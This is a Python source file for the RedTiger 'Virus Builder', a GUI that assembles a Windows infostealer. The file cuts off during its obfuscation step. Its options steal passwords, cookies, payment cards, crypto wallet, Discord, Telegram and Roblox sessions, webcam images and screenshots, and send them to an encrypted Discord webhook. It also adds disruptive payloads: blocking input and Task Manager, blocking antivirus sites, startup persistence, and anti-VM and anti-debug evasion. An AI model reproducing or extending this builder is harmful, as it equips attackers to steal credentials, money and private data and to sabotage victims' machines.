# Copyright (c) RedTiger 
# See the file 'LICENSE' for copying permission
# ----------------------------------------------------------------------------------------------------------------------------------------------------------|
# EN: 
#     - Do not touch or modify the code below. If there is an error, please contact the owner, but under no circumstances should you touch the code.
#     - Do not resell this tool, do not credit it to yours.
# FR: 
#     - Ne pas toucher ni modifier le code ci-dessous. En cas d'erreur, veuillez contacter le propriétaire, mais en aucun cas vous ne devez toucher au code.
#     - Ne revendez pas ce tool, ne le créditez pas au vôtre.

from Config.Util import *
from Config.Config import *
try:
    import customtkinter as ctk
    import tkinter
    import os
    import json
    import shutil
    import random
    import string
    import ast
    import base64
    from tkinter import filedialog
    from tkinter import messagebox
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.primitives import padding
    from cryptography.hazmat.backends import default_backend
except Exception as e:
    ErrorModule(e)

Title("Virus Builder")

try:
    exit_window = False

    colors = {
        "white"     : "#ffffff",
        "red"       : "#a80505",
        "dark_red"  : "#800000",
        "dark_gray" : "#1e1e1e",
        "gray"      : "#444444",
        "light_gray": "#949494",
        "background": "#262626"
    }

    def ClosingWindow():
        global exit_window
        exit_window = True
        after_ids = builder.tk.eval('after info').split()
        for after_id in after_ids:
            try: builder.after_cancel(after_id)
            except: pass

        try: builder.quit()
        except: pass
        try: builder.destroy()
        except: pass

    def ClosingBuild():
        after_ids = builder.tk.eval('after info').split()
        for after_id in after_ids:
            try: builder.after_cancel(after_id)
            except: pass

        try: builder.quit()
        except: pass
        try: builder.destroy()
        except: pass

    builder = ctk.CTk()
    builder.title(f"RedTiger {version_tool} - Virus Builder")
    builder.geometry("800x720")
    builder.resizable(False, False)
    builder.configure(fg_color=colors["background"])
    builder.iconbitmap(os.path.join(tool_path, "Img", "RedTiger_icon.ico"))

    option_system                    = "Disable"
    option_game_launchers            = "Disable"
    option_wallets                   = "Disable"
    option_apps                      = "Disable"
    option_discord                   = "Disable"
    option_discord_injection         = "Disable"
    option_passwords                 = "Disable"
    option_cookies                   = "Disable"
    option_history                   = "Disable"
    option_downloads                 = "Disable"
    option_cards                     = "Disable"
    option_extentions                = "Disable"
    option_interesting_files         = "Disable"
    option_roblox                    = "Disable"
    option_webcam                    = "Disable"
    option_screenshot                = "Disable"

    option_block_key                 = "Disable"
    option_block_mouse               = "Disable"
    option_block_task_manager        = "Disable"
    option_block_website             = "Disable"
    option_shutdown                  = "Disable"
    option_spam_open_programs        = "Disable"
    option_spam_create_files         = "Disable"
    option_fake_error                = "Disable"
    option_startup                   = "Disable"
    option_restart                   = "Disable"
    option_anti_vm_and_debug         = "Disable"
    webhook                          = "None"
    name_file                        = "None"
    icon_path                        = "None"
    file_type                        = "None"

    option_system_var                    = ctk.StringVar(value="Disable")
    option_game_launchers_var            = ctk.StringVar(value="Disable")
    option_wallets_var                   = ctk.StringVar(value="Disable")
    option_apps_var                      = ctk.StringVar(value="Disable")
    option_roblox_var                    = ctk.StringVar(value="Disable")
    option_discord_var                   = ctk.StringVar(value="Disable")
    option_discord_injection_var         = ctk.StringVar(value="Disable")
    option_passwords_var                 = ctk.StringVar(value="Disable")
    option_cookies_var                   = ctk.StringVar(value="Disable")
    option_history_var                   = ctk.StringVar(value="Disable")
    option_downloads_var                 = ctk.StringVar(value="Disable")
    option_cards_var                     = ctk.StringVar(value="Disable")
    option_extentions_var                = ctk.StringVar(value="Disable")
    option_interesting_files_var         = ctk.StringVar(value="Disable")
    option_webcam_var                    = ctk.StringVar(value="Disable")
    option_screenshot_var                = ctk.StringVar(value="Disable")
    option_block_key_var                 = ctk.StringVar(value="Disable")
    option_block_mouse_var               = ctk.StringVar(value="Disable")
    option_block_task_manager_var        = ctk.StringVar(value="Disable")
    option_block_website_var             = ctk.StringVar(value="Disable")
    option_shutdown_var                  = ctk.StringVar(value="Disable")
    option_spam_open_programs_var        = ctk.StringVar(value="Disable")
    option_spam_create_files_var         = ctk.StringVar(value="Disable")
    option_fake_error_var                = ctk.StringVar(value="Disable")
    option_startup_var                   = ctk.StringVar(value="Disable")
    option_restart_var                   = ctk.StringVar(value="Disable")
    option_anti_vm_and_debug_var         = ctk.StringVar(value="Disable")
    file_type_var                        = ctk.StringVar(value="File Type")
    webhook_var                          = ctk.StringVar(value="None")

    def ErrorLogs(message):
        print(f"{BEFORE + current_time_hour() + AFTER} {ERROR} {message + white}")
        messagebox.showerror(f"RedTiger {version_tool} - Virus Builder", message)

    def InfoLogs(message):
        messagebox.showinfo(f"RedTiger {version_tool} - Virus Builder", message)

    def TestWebhook():
        if CheckWebhook(webhook_url.get()) == True:
            InfoLogs("The webhook is valid.")
        else:
            ErrorLogs("The webhook is invalid.")

    Slow(virus_banner)
    
    title_frame = ctk.CTkFrame(builder, width=780, height=198, fg_color=colors["background"]) 
    title_frame.grid(row=1, column=0, sticky="w", pady=(10, 0), padx=(10, 0))
    title_frame.grid_propagate(False)
    title_frame.grid_columnconfigure(0, weight=1)

    title = ctk.CTkLabel(title_frame, text="Virus Builder", font=ctk.CTkFont(family="Helvetica", size=40, weight="bold"), text_color=colors["red"])
    title.grid(row=1, pady=(10, 0), sticky="we", columnspan=3)

    text = ctk.CTkLabel(title_frame, text="The builder only creates viruses that work under Windows.", font=ctk.CTkFont(family="Helvetica", size=13), text_color=colors["red"])
    text.grid(row=2, pady=0, columnspan=3, sticky="we")

    url = ctk.CTkLabel(title_frame, text=github_tool, font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
    url.grid(row=3, pady=(3, 10), columnspan=3, sticky="we")

    webhook_url = ctk.CTkEntry(title_frame, height=45, width=350, corner_radius=5, font=ctk.CTkFont(family="Helvetica", size=15), justify="center", border_color=colors["red"], fg_color=colors["dark_gray"], border_width=2, placeholder_text="https://discord.com/api/webhooks/...", text_color=colors['white'])
    webhook_url.grid(row=4, column=0, padx=(150, 5), pady=10, sticky="we")

    test_webhook = ctk.CTkButton(title_frame, text="Test Webhook", command=TestWebhook, height=45, corner_radius=5, fg_color=colors["red"], hover_color=colors["dark_red"], font=ctk.CTkFont(family="Helvetica", size=14))
    test_webhook.grid(row=4, column=1, padx=(5, 150), pady=10, sticky="we")

    options_stealer_frame = ctk.CTkFrame(builder, width=720, height=209, fg_color=colors["dark_gray"]) 
    options_stealer_frame.grid(row=2, column=0, sticky="w", pady=(10, 0), padx=(40, 0))
    options_stealer_frame.grid_propagate(False)
    options_stealer_frame.grid_columnconfigure(0, weight=1)
    options_stealer_frame.grid_columnconfigure(1, weight=1)
    options_stealer_frame.grid_columnconfigure(2, weight=1)

    options_malware_frame = ctk.CTkFrame(builder, width=720, height=150, fg_color=colors["dark_gray"]) 
    options_malware_frame.grid(row=3, column=0, sticky="w", pady=(10, 0), padx=(40, 0))
    options_malware_frame.grid_propagate(False)
    options_malware_frame.grid_columnconfigure(0, weight=1)
    options_malware_frame.grid_columnconfigure(1, weight=1)
    options_malware_frame.grid_columnconfigure(2, weight=1)

    def ChooseIcon():
        global icon_path
        try:
            if sys.platform.startswith("win"):
                root = tkinter.Tk()
                root.iconbitmap(os.path.join(tool_path, "Img", "RedTiger_icon.ico"))
                root.withdraw()
                root.attributes('-topmost', True)
                icon_path = filedialog.askopenfilename(parent=root, title=f"{name_tool} {version_tool} - Choose an icon (.ico)", filetypes=[("ICO files", "*.ico")])
            elif sys.platform.startswith("linux"):
                icon_path = filedialog.askopenfilename(title=f"{name_tool} {version_tool} - Choose an icon (.ico)", filetypes=[("ICO files", "*.ico")])
        except:
            pass
        
    fake_error_title         = "Microsoft Excel"
    fake_error_message       = "The file is corrupt and cannot be opened."
    fake_error_window_status = True

    def CreateFakeErrorWindow():
        global fake_error_window_status
        if fake_error_window_status:
            fake_error_window_status = False
            pass
        else:
            fake_error_window_status = True
            return

        fake_error_window = ctk.CTkToplevel(builder)
        fake_error_window.title(f"RedTiger {version_tool} - Fake Error")

        fake_error_window.geometry("300x250")
        fake_error_window.resizable(False, False)
        fake_error_window.configure(fg_color=colors["background"])

        fake_error_title_entry = ctk.CTkEntry(fake_error_window, justify="center", placeholder_text="Error Title", fg_color=colors["dark_gray"], border_color=colors["red"], font=ctk.CTkFont(family="Helvetica", size=13), height=40, width=260)
        fake_error_title_entry.grid(row=0, column=0, padx=20, pady=(20, 10), sticky="ew")

        fake_error_message_entry = ctk.CTkEntry(fake_error_window, justify="center", placeholder_text="Error Message", fg_color=colors["dark_gray"], border_color=colors["red"], font=ctk.CTkFont(family="Helvetica", size=13), height=40, width=260)
        fake_error_message_entry.grid(row=1, column=0, padx=20, pady=(10, 20), sticky="ew")

        def Validate():
            global fake_error_title, fake_error_message
            fake_error_title = fake_error_title_entry.get()
            fake_error_message = fake_error_message_entry.get()
            print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Fake Error Title  : {white + fake_error_title}")
            print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Fake Error Message: {white + fake_error_message}")
            fake_error_window.quit()
            
        validate_button = ctk.CTkButton(fake_error_window, text="Validate", command=Validate, fg_color=colors["red"], hover_color=colors["dark_red"], font=ctk.CTkFont(family="Helvetica", size=14), height=40, width=100)
        validate_button.grid(row=2, column=0, padx=20, pady=10, sticky="ew")
        fake_error_window.mainloop()

    option_system_cb                    = ctk.CTkCheckBox(options_stealer_frame, text="System Info",            variable=option_system_var,                    onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
    option_wallets_cb                   = ctk.CTkCheckBox(options_stealer_frame, text="Wallets Session Files",  variable=option_wallets_var,                   onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
    option_game_launchers_cb            = ctk.CTkCheckBox(options_stealer_frame, text="Games Session Files",    variable=option_game_launchers_var,            onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
    option_apps_cb                      = ctk.CTkCheckBox(options_stealer_frame, text="Telegram Session Files", variable=option_apps_var,                      onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
    option_roblox_cb                    = ctk.CTkCheckBox(options_stealer_frame, text="Roblox Accounts",        variable=option_roblox_var,                    onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
    option_discord_cb                   = ctk.CTkCheckBox(options_stealer_frame, text="Discord Accounts",       variable=option_discord_var,                   onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
    option_discord_injection_cb         = ctk.CTkCheckBox(options_stealer_frame, text="Discord Injection",      variable=option_discord_injection_var,         onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
    option_passwords_cb                 = ctk.CTkCheckBox(options_stealer_frame, text="Passwords",              variable=option_passwords_var,                 onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
    option_cookies_cb                   = ctk.CTkCheckBox(options_stealer_frame, text="Cookies",                variable=option_cookies_var,                   onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
    option_history_cb                   = ctk.CTkCheckBox(options_stealer_frame, text="Browsing History",       variable=option_history_var,                   onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
    option_downloads_cb                 = ctk.CTkCheckBox(options_stealer_frame, text="Download History",       variable=option_downloads_var,                 onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
    option_cards_cb                     = ctk.CTkCheckBox(options_stealer_frame, text="Cards",                  variable=option_cards_var,                     onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
    option_extentions_cb                = ctk.CTkCheckBox(options_stealer_frame, text="Extentions",             variable=option_extentions_var,                onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
    option_interesting_files_cb         = ctk.CTkCheckBox(options_stealer_frame, text="Interesting Files",      variable=option_interesting_files_var,         onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
    option_webcam_cb                    = ctk.CTkCheckBox(options_stealer_frame, text="Webcam",                 variable=option_webcam_var,                    onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
    option_screenshot_cb                = ctk.CTkCheckBox(options_stealer_frame, text="Screenshot",             variable=option_screenshot_var,                onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
    
    option_block_key_cb                 = ctk.CTkCheckBox(options_malware_frame, text="Block Key",              variable=option_block_key_var,                 onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
    option_block_mouse_cb               = ctk.CTkCheckBox(options_malware_frame, text="Block Mouse",            variable=option_block_mouse_var,               onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
    option_block_task_manager_cb        = ctk.CTkCheckBox(options_malware_frame, text="Block Task Manager",     variable=option_block_task_manager_var,        onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
    option_block_website_cb             = ctk.CTkCheckBox(options_malware_frame, text="Block AV Website",       variable=option_block_website_var,             onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
    option_shutdown_cb                  = ctk.CTkCheckBox(options_malware_frame, text="Shutdown",               variable=option_shutdown_var,                  onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
    option_fake_error_cb                = ctk.CTkCheckBox(options_malware_frame, text="Fake Error",             variable=option_fake_error_var,                onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'], command=CreateFakeErrorWindow)
    option_spam_open_programs_cb        = ctk.CTkCheckBox(options_malware_frame, text="Spam Open Program",      variable=option_spam_open_programs_var,        onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
    option_spam_create_files_cb         = ctk.CTkCheckBox(options_malware_frame, text="Spam Create File",       variable=option_spam_create_files_var,         onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
    option_anti_vm_and_debug_cb         = ctk.CTkCheckBox(options_malware_frame, text="Anti VM & Debug",        variable=option_anti_vm_and_debug_var,         onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
    option_startup_cb                   = ctk.CTkCheckBox(options_malware_frame, text="Launch at Startup",      variable=option_startup_var,                   onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
    option_restart_cb                   = ctk.CTkCheckBox(options_malware_frame, text="Restart Every 5min",     variable=option_restart_var,                   onvalue="Enable", offvalue="Disable", fg_color=colors['red'], hover_color=colors['red'], border_color=colors['red'],      font=ctk.CTkFont(family="Helvetica", size=15), text_color=colors['white'])
    
    option_system_cb.grid(                   row=1, column=0, padx=(60, 0), pady=(18,3), sticky="nswe")
    option_wallets_cb.grid(                  row=2, column=0, padx=(60, 0), pady=3,      sticky="nswe")
    option_game_launchers_cb.grid(           row=3, column=0, padx=(60, 0), pady=3,      sticky="nswe")
    option_apps_cb.grid(                     row=4, column=0, padx=(60, 0), pady=3,      sticky="nswe")
    option_roblox_cb.grid(                   row=5, column=0, padx=(60, 0), pady=3,      sticky="nswe")
    option_discord_cb.grid(                  row=6, column=0, padx=(60, 0), pady=3,      sticky="nswe")

    option_discord_injection_cb.grid(        row=1, column=1, padx=(0, 0),  pady=(18,3), sticky="nswe")
    option_passwords_cb.grid(                row=2, column=1, padx=(0, 0),  pady=3,      sticky="nswe")
    option_cookies_cb.grid(                  row=3, column=1, padx=(0, 0),  pady=3,      sticky="nswe")
    option_history_cb.grid(                  row=4, column=1, padx=(0, 0),  pady=3,      sticky="nswe")
    option_downloads_cb.grid(                row=5, column=1, padx=(0, 0),  pady=3,      sticky="nswe")
    option_cards_cb.grid(                    row=6, column=1, padx=(0, 0),  pady=3,      sticky="nswe")

    option_extentions_cb.grid(               row=1, column=2, padx=(0, 0),  pady=(18,3), sticky="nswe")
    option_interesting_files_cb.grid(        row=2, column=2, padx=(0, 0),  pady=3,      sticky="nswe")
    option_webcam_cb.grid(                   row=3, column=2, padx=(0, 0),  pady=3,      sticky="nswe")
    option_screenshot_cb.grid(               row=4, column=2, padx=(0, 0),  pady=3,      sticky="nswe")

    option_block_key_cb.grid(                row=1, column=0, padx=(60, 0), pady=(18,3), sticky="nswe")
    option_block_mouse_cb.grid(              row=2, column=0, padx=(60, 0), pady=3,      sticky="nswe")
    option_block_task_manager_cb.grid(       row=3, column=0, padx=(60, 0), pady=3,      sticky="nswe")
    option_block_website_cb.grid(            row=4, column=0, padx=(60, 0), pady=3,      sticky="nswe")

    option_spam_open_programs_cb.grid(       row=1, column=1, padx=(0, 0),  pady=(18,3), sticky="nswe")
    option_spam_create_files_cb.grid(        row=2, column=1, padx=(0, 0),  pady=3,      sticky="nswe")
    option_shutdown_cb.grid(                 row=3, column=1, padx=(0, 0),  pady=3,      sticky="nswe")
    option_fake_error_cb.grid(               row=4, column=1, padx=(0, 0),  pady=3,      sticky="nswe")

    option_anti_vm_and_debug_cb.grid(        row=1, column=2, padx=(0, 0),  pady=(18,3), sticky="nswe")
    option_startup_cb.grid(                  row=2, column=2, padx=(0, 0),  pady=3,      sticky="nswe")
    option_restart_cb.grid(                  row=3, column=2, padx=(0, 0),  pady=3,      sticky="nswe")
    
    build_frame = ctk.CTkFrame(builder, width=720, height=40, fg_color=colors["background"]) 
    build_frame.grid(row=4, column=0, sticky="w", pady=(10, 0), padx=(40, 0))
    build_frame.grid_propagate(False)
    build_frame.grid_columnconfigure(0, weight=1)
    build_frame.grid_columnconfigure(1, weight=1)
    build_frame.grid_columnconfigure(2, weight=1)

    name_file_entry = ctk.CTkEntry(build_frame, height=30, width=140, corner_radius=5, font=ctk.CTkFont(family="Helvetica", size=12), justify="center", border_color=colors["red"], text_color=colors['white'], fg_color=colors["dark_gray"], border_width=2, placeholder_text="File Name")
    name_file_entry.grid(row=1, column=0, padx=0, sticky="w", pady=0)

    def FileTypeChanged(*args):
        if file_type_var.get() == "Python File":
            icon_button.configure(state="disabled")
        elif file_type_var.get() == "File Type":
            icon_button.configure(state="disabled")
        else:
            icon_button.configure(state="normal")

    file_type_menu = ctk.CTkOptionMenu(build_frame, height=30, width=140, font=ctk.CTkFont(family="Helvetica", size=12), variable=file_type_var, values=["Python File", "Exe File"], fg_color=colors['dark_gray'], button_color=colors["red"], button_hover_color=colors['dark_red'])
    file_type_menu.grid(row=1, column=2, sticky="w", padx=0, pady=0)

    icon_button = ctk.CTkButton(build_frame, height=30, width=140, text="Select Icon", command=ChooseIcon, fg_color=colors["red"], hover_color=colors["dark_red"], text_color_disabled=colors["light_gray"])
    icon_button.grid(row=1, column=2, sticky="e", padx=0, pady=0)
    icon_button.configure(state="disabled")
    file_type_var.trace_add("write", lambda *args: FileTypeChanged())

    build_frame.grid_columnconfigure(0, minsize=0)

    def BuildSettings():
        global option_system, option_game_launchers, option_wallets, option_apps, option_discord, option_discord_injection, option_passwords, option_cookies, option_history, option_downloads, option_cards, option_extentions, option_interesting_files, option_roblox, option_webcam, option_screenshot, option_block_key, option_block_mouse, option_block_task_manager, option_block_website, option_spam_open_programs, option_spam_create_files, option_shutdown ,option_fake_error,  option_startup, option_restart, option_anti_vm_and_debug, webhook, name_file, file_type, icon_path
        option_system                    = option_system_var.get()
        option_game_launchers            = option_game_launchers_var.get()
        option_wallets                   = option_wallets_var.get()
        option_apps                      = option_apps_var.get()
        option_discord                   = option_discord_var.get()
        option_discord_injection         = option_discord_injection_var.get()
        option_passwords                 = option_passwords_var.get()
        option_cookies                   = option_cookies_var.get()
        option_history                   = option_history_var.get()
        option_downloads                 = option_downloads_var.get()
        option_cards                     = option_cards_var.get()
        option_extentions                = option_extentions_var.get()
        option_interesting_files         = option_interesting_files_var.get()
        option_roblox                    = option_roblox_var.get()
        option_webcam                    = option_webcam_var.get()
        option_screenshot                = option_screenshot_var.get()
        option_block_website             = option_block_website_var.get()
        option_block_key                 = option_block_key_var.get()
        option_block_mouse               = option_block_mouse_var.get()
        option_block_task_manager        = option_block_task_manager_var.get()
        option_shutdown                  = option_shutdown_var.get()
        option_spam_open_programs        = option_spam_open_programs_var.get()
        option_spam_create_files         = option_spam_create_files_var.get()
        option_fake_error                = option_fake_error_var.get()
        option_startup                   = option_startup_var.get()
        option_restart                   = option_restart_var.get()
        option_anti_vm_and_debug         = option_anti_vm_and_debug_var.get()
        webhook                          = webhook_url.get()
        name_file                        = name_file_entry.get()
        file_type                        = file_type_var.get()

        if not webhook.strip():
            ErrorLogs("Please enter the webhook.")
            return
        
        if not name_file.strip():
            ErrorLogs("Please choose the file name.")
            return
        
        if file_type == "File Type":
            ErrorLogs("Please choose the file type.")
            return
        
        ClosingBuild()

    build = ctk.CTkButton(builder, text="Build", command=BuildSettings, height=40, corner_radius=5, fg_color=colors["red"], hover_color=colors["dark_red"], font=ctk.CTkFont(family="Helvetica", size=14))
    build.grid(row=5, column=0, padx=330, pady=30, sticky="nswe")

    builder.protocol("WM_DELETE_WINDOW", ClosingWindow)

    builder.mainloop()

    if not exit_window:
        builder.destroy()

    time.sleep(1)

    if file_type == "File Type" or file_type == "None" or not name_file.strip() or name_file == "None" or not webhook.strip() or webhook == "None":
        ErrorLogs("You have closed the page, so your virus will not be built.")
        Continue()
        Reset()

    option_extentions                = option_extentions_var.get()
    option_interesting_files         = option_interesting_files_var.get()   

    print(f"""
    {red}Stealer Options:{white}
    {option_system            } System Info            {option_discord_injection } Discord Injection      {option_extentions       } Extentions
    {option_wallets           } Wallets Session Files  {option_passwords         } Passwords              {option_interesting_files} Interesting Files                   
    {option_game_launchers    } Games Session Files    {option_cookies           } Cookies                {option_webcam           } Webcam 
    {option_apps              } Telegram Session Files {option_history           } Browsing History       {option_screenshot       } Screenshot
    {option_roblox            } Roblox Accounts        {option_downloads         } Download History
    {option_discord           } Discord Accounts       {option_cards             } Cards

    {red}Malware Options:{white}
    {option_block_key         } Block Key              {option_shutdown          } Shutdown               {option_anti_vm_and_debug} Anti VM & Debug
    {option_block_mouse       } Block Mouse            {option_fake_error        } Fake Error             {option_startup          } Launch at Startup
    {option_block_task_manager} Block Task Manager     {option_spam_open_programs} Spam Open Program      {option_restart          } Restart Every 5min
    {option_block_website     } Block AV Website       {option_spam_create_files } Spam Create File
""".replace(f"Enable", f"{BEFORE_GREEN}+{AFTER_GREEN}").replace(f"Disable", f"{BEFORE}x{AFTER}"))

    if option_fake_error == "Enable":
        print(f"""{red}Fake Error Title   : {white + fake_error_title}
{red}Fake Error Message : {white + fake_error_message}""")

    print(f"""{red}Webhook   : {white + webhook[:90] + '..'}
{red}File Type : {white + file_type}
{red}File Name : {white + name_file}""")

    if icon_path:
        if 100 < len(icon_path):
            icon_path_cut = icon_path[:100] + '..'
        else:
            icon_path_cut = icon_path
        print(f"{red}Icon Path : {white + icon_path_cut}")
    else:
        ErrorLogs("Please choose the file type.")
        Continue()
        Reset()
    
    def Encryption(webhook):
        def Encrypt(decrypted, key):
            def DeriveKey(password, salt):
                kdf = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=salt, iterations=100000, backend=default_backend())
                if isinstance(password, str):  
                    password = password.encode()  
                return kdf.derive(password)
            
            salt = os.urandom(16)
            derived_key = DeriveKey(key, salt)
            iv = os.urandom(16)
            padder = padding.PKCS7(128).padder()
            padded_data = padder.update(decrypted.encode()) + padder.finalize()
            cipher = Cipher(algorithms.AES(derived_key), modes.CBC(iv), backend=default_backend())
            encryptor = cipher.encryptor()
            encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
            encrypted_message = salt + iv + encrypted_data
            return base64.b64encode(encrypted_message).decode()
        
        key_encryption = ''.join(random.choices(string.ascii_uppercase + string.ascii_lowercase, k=random.randint(100,200)))
        print(f"\n{BEFORE + current_time_hour() + AFTER} {INFO} Encryption key created: {white + key_encryption[:75] + '..'}")
        webhook_encrypted = Encrypt(webhook, key_encryption)
        print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Encrypted webhook: {white + webhook_encrypted[:75] + '..'}")

        return key_encryption, webhook_encrypted
    
    def PythonFile(file_python, file_python_relative, key_encryption, webhook_encrypted):
        if file_type in ["Exe File", "Python File"]:
            try:
                browser_choice = []
                if option_extentions == 'Enable':
                    browser_choice.append('"extentions"')
                if option_passwords == 'Enable':
                    browser_choice.append('"passwords"')
                if option_cookies == 'Enable':
                    browser_choice.append('"cookies"')
                if option_history == 'Enable':
                    browser_choice.append('"history"')
                if option_downloads == 'Enable':
                    browser_choice.append('"downloads"')
                if option_cards == 'Enable':
                    browser_choice.append('"cards"')

                session_files_choice = []
                if option_wallets == 'Enable':
                    session_files_choice.append('"Wallets"')
                if option_game_launchers == 'Enable':
                    session_files_choice.append('"Game Launchers"')
                if option_apps == 'Enable':
                    session_files_choice.append('"Apps"')

                with open(file_python, 'w', encoding='utf-8') as file:

                    if option_anti_vm_and_debug == 'Enable':
                        file.write(Ant1VM4ndD3bug)

                    file.write(Obligatory.replace("%WEBHOOK_URL%", webhook_encrypted).replace("%KEY%", key_encryption).replace("%LINK_AVATAR%", avatar_webhook).replace("%LINK_GITHUB%", github_tool).replace("%LINK_WEBSITE%", website))

                    if option_system == 'Enable':
                        file.write(Sy5t3mInf0)

                    if option_discord == 'Enable':
                        file.write(Di5c0rdAccount)

                    if option_discord_injection == 'Enable':
                        file.write(Di5c0rdIj3ct10n)

                    if option_interesting_files == 'Enable':
                        file.write(Int3r3stingFil3s)

                    if session_files_choice:
                        file.write(S3ssi0nFil3s.replace('"%SESSION_FILES_CHOICE%"', ', '.join(session_files_choice)))

                    if browser_choice:
                        file.write(Br0w53r5t341.replace('"%BROWSER_CHOICE%"', ', '.join(browser_choice)))

                    if option_roblox == 'Enable':
                        file.write(R0b10xAccount)

                    if option_webcam == 'Enable':
                        file.write(W3bc4m)

                    if option_screenshot == 'Enable':
                        file.write(Scr33n5h0t)

                    if option_block_key == 'Enable':
                        file.write(B10ckK3y)

                    if option_block_mouse == 'Enable':
                        file.write(B10ckM0u53)

                    if option_block_task_manager == 'Enable':
                        file.write(B10ckT45kM4n4g3r)

                    if option_block_website == 'Enable':
                        file.write(B10ckW3b5it3)

                    if option_fake_error == 'Enable':
                        file.write(F4k33rr0r(fake_error_title, fake_error_message))

                    if option_spam_open_programs == 'Enable':
                        file.write(Sp4m0p3nPr0gr4m)

                    if option_spam_create_files == 'Enable':
                        file.write(Sp4mCr34tFil3)

                    if option_shutdown == 'Enable':
                        file.write(Shutd0wn)

                    if option_startup == 'Enable':
                        file.write(St4rtup)

                    if option_spam_open_programs == 'Enable' or option_block_mouse == 'Enable' or option_spam_create_files == 'Enable':
                        file.write(Sp4mOpti0ns)

                    if option_restart == 'Enable':
                        file.write(R3st4rt)

                    file.write(St4rt)

                print(f"{BEFORE + current_time_hour() + AFTER} {INFO} Python file created: {white + file_python_relative}")
            except Exception as e:
                print(f"\n{BEFORE + current_time_hour() + AFTER} {ERROR} Python file not created: {white + e}")
                Continue()
                Reset()

    def PythonIdentifierObfuscation(file_python):
        if file_type in ["Exe File", "Python File"]:
            try:
                variable_map = {}

                def RandomName():
                    return ''.join(random.choices(string.ascii_uppercase, k=random.randint(50,100)))

                with open(file_python, 'r', encoding='utf-8') as file:
                    original_script = file.read()

                def visit_node(node):
                    if isinstance(node, ast.Assign):
                        for target in node.targets:
                            if isinstance(target, ast.Name):
                                var_name = target.id
                                if var_name not in variable_map and "v4r_" in var_name:
